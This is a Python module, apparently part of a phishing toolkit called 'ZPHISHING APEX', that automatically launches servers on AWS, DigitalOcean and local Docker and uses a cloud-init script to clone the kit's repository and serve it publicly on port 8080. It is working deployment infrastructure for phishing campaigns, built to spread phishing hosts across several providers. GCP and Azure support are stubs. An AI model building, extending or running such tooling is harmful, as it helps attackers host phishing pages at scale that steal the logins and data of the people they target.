#!/usr/bin/env python3
"""
ZPHISHING APEX — Distributed Infrastructure
Auto-spin cloud instances across providers
"""

import os
import json
import time
import hashlib
from typing import Dict, List, Optional
from dataclasses import dataclass

import boto3
import digitalocean
from google.cloud import compute_v1
from azure.identity import DefaultAzureCredential
from azure.mgmt.compute import ComputeManagementClient
import docker
from kubernetes import client, config

@dataclass
class Instance:
    id: str
    provider: str
    instance_id: str
    ip: str
    status: str
    created_at: float

class DistributedInfrastructure:
    def __init__(self):
        self.instances = []
        self.docker_client = docker.from_env()

        # Initialize cloud clients
        self.aws_client = boto3.client('ec2') if os.environ.get('AWS_ACCESS_KEY_ID') else None
        self.do_client = digitalocean.Manager(token=os.environ.get('DIGITALOCEAN_TOKEN')) if os.environ.get('DIGITALOCEAN_TOKEN') else None
        self.gcp_client = compute_v1.InstancesClient() if os.environ.get('GOOGLE_APPLICATION_CREDENTIALS') else None
        self.azure_client = None

        if os.environ.get('AZURE_SUBSCRIPTION_ID'):
            credential = DefaultAzureCredential()
            self.azure_client = ComputeManagementClient(credential, os.environ.get('AZURE_SUBSCRIPTION_ID'))

    def deploy(self, data: Dict) -> Dict:
        """Deploy infrastructure"""
        provider = data.get('provider', 'docker')

        if provider == 'aws':
            return self._deploy_aws(data)
        elif provider == 'digitalocean':
            return self._deploy_digitalocean(data)
        elif provider == 'gcp':
            return self._deploy_gcp(data)
        elif provider == 'azure':
            return self._deploy_azure(data)
        else:
            return self._deploy_docker(data)

    def _deploy_aws(self, data: Dict) -> Dict:
        """Deploy to AWS"""
        if not self.aws_client:
            return {'error': 'AWS not configured'}

        response = self.aws_client.run_instances(
            ImageId='ami-0c55b159cbfafe1f0',  # Ubuntu 22.04
            InstanceType='t2.micro',
            MinCount=1,
            MaxCount=1,
            UserData=self._get_user_data(),
            TagSpecifications=[{
                'ResourceType': 'instance',
                'Tags': [{'Key': 'Name', 'Value': f'zphishing-{int(time.time())}'}]
            }]
        )

        instance_id = response['Instances'][0]['InstanceId']

        # Wait for instance
        waiter = self.aws_client.get_waiter('instance_running')
        waiter.wait(InstanceIds=[instance_id])

        # Get IP
        response = self.aws_client.describe_instances(InstanceIds=[instance_id])
        ip = response['Reservations'][0]['Instances'][0]['PublicIpAddress']

        instance = Instance(
            id=hashlib.md5(f"{instance_id}{time.time()}".encode()).hexdigest()[:12],
            provider='aws',
            instance_id=instance_id,
            ip=ip,
            status='running',
            created_at=time.time()
        )

        self.instances.append(instance)

        return {
            'id': instance.id,
            'provider': 'aws',
            'instance_id': instance_id,
            'ip': ip,
            'status': 'running'
        }

    def _deploy_digitalocean(self, data: Dict) -> Dict:
        """Deploy to DigitalOcean"""
        if not self.do_client:
            return {'error': 'DigitalOcean not configured'}

        droplet = digitalocean.Droplet(
            token=os.environ.get('DIGITALOCEAN_TOKEN'),
            name=f'zphishing-{int(time.time())}',
            region='nyc3',
            image='ubuntu-22-04-x64',
            size_slug='s-1vcpu-1gb',
            user_data=self._get_user_data(),
            ssh_keys=[]
        )

        droplet.create()

        # Wait for droplet
        while droplet.status != 'active':
            time.sleep(5)
            droplet.load()

        instance = Instance(
            id=hashlib.md5(f"{droplet.id}{time.time()}".encode()).hexdigest()[:12],
            provider='digitalocean',
            instance_id=str(droplet.id),
            ip=droplet.ip_address,
            status='running',
            created_at=time.time()
        )

        self.instances.append(instance)

        return {
            'id': instance.id,
            'provider': 'digitalocean',
            'instance_id': str(droplet.id),
            'ip': droplet.ip_address,
            'status': 'running'
        }

    def _deploy_gcp(self, data: Dict) -> Dict:
        """Deploy to Google Cloud"""
        if not self.gcp_client:
            return {'error': 'GCP not configured'}

        return {'error': 'GCP deployment not implemented yet'}

    def _deploy_azure(self, data: Dict) -> Dict:
        """Deploy to Azure"""
        if not self.azure_client:
            return {'error': 'Azure not configured'}

        return {'error': 'Azure deployment not implemented yet'}

    def _deploy_docker(self, data: Dict) -> Dict:
        """Deploy to local Docker"""
        container = self.docker_client.containers.run(
            image='zphishing:latest',
            name=f'zphishing-{int(time.time())}',
            ports={'8080/tcp': 8080},
            detach=True,
            environment={
                'DATABASE_URL': os.environ.get('DATABASE_URL'),
                'REDIS_URL': os.environ.get('REDIS_URL')
            }
        )

        instance = Instance(
            id=hashlib.md5(f"{container.id}{time.time()}".encode()).hexdigest()[:12],
            provider='docker',
            instance_id=container.id,
            ip='localhost',
            status='running',
            created_at=time.time()
        )

        self.instances.append(instance)

        return {
            'id': instance.id,
            'provider': 'docker',
            'instance_id': container.id,
            'ip': 'localhost',
            'status': 'running'
        }

    def _get_user_data(self) -> str:
        """Get cloud-init user data"""
        return """#!/bin/bash
apt-get update
apt-get install -y python3 python3-pip git
git clone https://github.com/wormshadow/zphishing-apex.git
cd zphishing-apex
pip3 install -r requirements.txt
python3 zphishing.py serve --host 0.0.0.0 --port 8080
"""

    def destroy(self, data: Dict) -> Dict:
        """Destroy infrastructure"""
        instance_id = data.get('instance_id')
        provider = data.get('provider')

        for instance in self.instances:
            if instance.id == instance_id:
                if provider == 'aws':
                    self.aws_client.terminate_instances(InstanceIds=[instance.instance_id])
                elif provider == 'digitalocean':
                    droplet = digitalocean.Droplet(id=instance.instance_id)
                    droplet.destroy()
                elif provider == 'docker':
                    container = self.docker_client.containers.get(instance.instance_id)
                    container.stop()
                    container.remove()

                instance.status = 'destroyed'
                return {'status': 'destroyed'}

        return {'error': 'Instance not found'}

    def list_instances(self) -> List[Dict]:
        """List all instances"""
        return [{
            'id': i.id,
            'provider': i.provider,
            'instance_id': i.instance_id,
            'ip': i.ip,
            'status': i.status,
            'created_at': i.created_at
        } for i in self.instances]
